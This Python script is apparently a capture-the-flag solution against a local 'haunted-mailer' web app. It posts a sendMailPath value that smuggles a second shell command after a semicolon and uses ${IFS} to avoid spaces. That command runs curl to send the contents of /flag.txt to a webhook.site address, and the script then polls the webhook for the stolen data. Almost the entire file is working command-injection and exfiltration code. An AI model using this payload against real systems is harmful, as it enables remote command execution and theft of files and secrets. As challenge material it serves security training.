import requests, random, string

host = '127.0.0.1:1337'

class WEBHOOK:
    def __init__(self):
        self.url = "https://webhook.site"
        try:
            resp = requests.post('{}/token'.format(self.url), json={"actions": True, "alias": ''.join(random.choices(string.ascii_letters, k=20)), "cors": False}, timeout=15)
            self.token = resp.json()['uuid']
        except:
            print("[!] Couldn't reach webhook.site, please make sure we have internet access!")
            sys.exit()

    def get_flag(self):
        try:
            resp = requests.get('{}/token/{}/request/latest'.format(self.url,self.token), timeout=15)
            flag = resp.json()['url']
        except:
            return False
        return flag

    def destroy(self):
        requests.delete('{}/token/{}'.format(self.url,self.token), timeout=15)


webhook = WEBHOOK()

data = {
    'from': 'Ghostly Support',
    'email': 'support@haunted-mailer.htb',
    'sendMailPath': '/usr/sbin/sendmail;curl${IFS}https://webhook.site/'+webhook.token+'?x=$(cat${IFS}/flag.txt)',
    'mailProgram': 'sendmail'
}

response = requests.post(f'http://{host}/update', headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=data)

while True:
    flag = webhook.get_flag()
    if flag:
        break

print(flag)
